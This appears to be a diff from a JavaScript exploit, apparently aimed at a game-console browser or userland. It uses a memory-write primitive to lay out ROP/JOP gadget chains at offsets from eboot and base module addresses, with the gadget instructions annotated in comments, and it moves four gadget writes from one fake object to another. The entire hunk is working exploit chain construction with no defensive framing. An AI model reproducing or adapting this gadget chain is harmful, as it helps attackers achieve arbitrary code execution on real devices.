@@ -627,10 +627,6 @@ prim.write8(pwn_addr.add(new BigInt(0, 0x00)), new BigInt(0x002A1500, 0x0000002A
 prim.write8(pwn_addr.add(new BigInt(0, 0x08)), new BigInt(0, 0xe9b0).add(eboot_addr)) // push rbp ; mov rbp, rsp ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x20]
 prim.write8(pwn_addr.add(new BigInt(0, 0x10)), arr_a_addr)
 prim.write8(pwn_addr.add(new BigInt(0, 0x18)), fake_exec_addr)
-prim.write8(pwn_addr.add(new BigInt(0, 0x20)), new BigInt(0, 0x244916).add(eboot_addr)) // mov rdx, qword ptr [rdi + 0x20] ; mov r12, rdi ; call qword ptr [r12 + 0x18]
-prim.write8(pwn_addr.add(new BigInt(0, 0x40)), new BigInt(0, 0x165df5).add(eboot_addr)) // mov r13, rdx ; call qword ptr [rax + 0x70]
-prim.write8(pwn_addr.add(new BigInt(0, 0x48)), new BigInt(0, 0x10b5).add(eboot_addr)) // mov rax, qword ptr [rdi] ; call qword ptr [rax + 8]
-prim.write8(pwn_addr.add(new BigInt(0, 0x70)), new BigInt(0, 0x3068ff).add(base_addr)) // mov rcx, qword ptr [r13 + r12] ; call qword ptr [rax + 0x48]
 
 // Setup arr_a values
 prim.write8(arr_a_addr.add(new BigInt(0, 0x00)), arr_c_addr)
@@ -646,6 +642,10 @@ prim.write8(arr_b_addr.add(new BigInt(0, 0x4e8)), new BigInt(0, 0x40)) // random
 prim.write8(arr_c_addr.add(new BigInt(0, 0x00)), new BigInt(0, 0x19bd6d).add(base_addr)) // mov rdx, qword ptr [rax + 0x10] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x10]
 prim.write8(arr_c_addr.add(new BigInt(0, 0x08)), new BigInt(0, 0xbf5ce).add(eboot_addr)) // add rdi, 0x60 ; call qword ptr [rax]
 prim.write8(arr_c_addr.add(new BigInt(0, 0x10)), arr_d_addr)
+prim.write8(arr_c_addr.add(new BigInt(0, 0x20)), new BigInt(0, 0x244916).add(eboot_addr)) // mov rdx, qword ptr [rdi + 0x20] ; mov r12, rdi ; call qword ptr [r12 + 0x18]
+prim.write8(arr_c_addr.add(new BigInt(0, 0x40)), new BigInt(0, 0x165df5).add(eboot_addr)) // mov r13, rdx ; call qword ptr [rax + 0x70]
+prim.write8(arr_c_addr.add(new BigInt(0, 0x48)), new BigInt(0, 0x10b5).add(eboot_addr)) // mov rax, qword ptr [rdi] ; call qword ptr [rax + 8]
+prim.write8(arr_c_addr.add(new BigInt(0, 0x70)), new BigInt(0, 0x3068ff).add(base_addr)) // mov rcx, qword ptr [r13 + r12] ; call qword ptr [rax + 0x48]
 
 // Setup arr_d values (custom stack)
 prim.write8(arr_d_addr.add(new BigInt(0, 0x00)), new BigInt(0, 0x19e297c).add(base_addr)) // pop r10 ; ret
